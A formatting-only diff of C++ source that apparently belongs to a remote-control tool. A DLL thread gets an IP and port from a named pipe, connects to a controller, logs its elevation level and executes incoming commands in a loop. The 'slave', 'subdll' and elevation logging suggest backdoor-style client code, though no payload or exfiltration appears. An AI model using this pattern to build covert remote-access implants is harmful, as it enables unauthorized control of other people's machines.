@@ -8,11 +8,9 @@ using namespace System;
 
 #include "SlaveCore.hpp"
 
-Common::ConnectionInfo getConnectionInfo()
-{
+Common::ConnectionInfo getConnectionInfo() {
 	Common::ConnectionInfo info;
-	try
-	{
+	try {
 		Network::Pipe pipe;
 		pipe.connect(Common::PIPE_NAME);
 		char blaspheme [Common::CONNECTION_INFO_SIZE];
@@ -31,9 +29,7 @@ Common::ConnectionInfo getConnectionInfo()
 
 		Common::fromString(port_buffer, info.port);
 		pipe.disconnect();
-	}
-	catch(Network::PipeException&)
-	{
+	} catch(Network::PipeException&) {
 //#ifndef INNOCENCE_DEBUG
 //		throw;
 //#else
@@ -46,10 +42,8 @@ Common::ConnectionInfo getConnectionInfo()
 	return info;
 }
 
-DWORD WINAPI subdll(void)
-{
-	try
-	{
+DWORD WINAPI subdll(void) {
+	try {
 		LOG.setIdentity(Common::identity);
 		LOG.addObserver(new Log::LogToConsole);
 		LOG.addObserver(new Log::LogToCollector);
@@ -58,28 +52,21 @@ DWORD WINAPI subdll(void)
 		Inhibition::SlaveCore slave(info);
 		LOG << GetElevationType();
 		LOG << "Trying connection on " + slave.getConnection().ip + ":" + Common::toString(slave.getConnection().port);
-		while(!slave.exiting())
-		{
-			try
-			{
-				if(slave.connect())
-				{
+		while(!slave.exiting()) {
+			try {
+				if(slave.connect()) {
 					LOG << "Session started";
 					while(slave.process_command());
 					LOG << "Session ended";
 					slave.disconnect();
 				}
 				Sleep(500);
-			}
-			catch(Network::Deconnection&)
-			{
+			} catch(Network::Deconnection&) {
 				LOG << "Untimely disconnect";
 				slave.disconnect();
 			}
 		}
-	}
-	catch(Common::Exception&)
-	{
+	} catch(Common::Exception&) {
 	}
 	CATCH_UNKNOWN_EXCEPTION
 
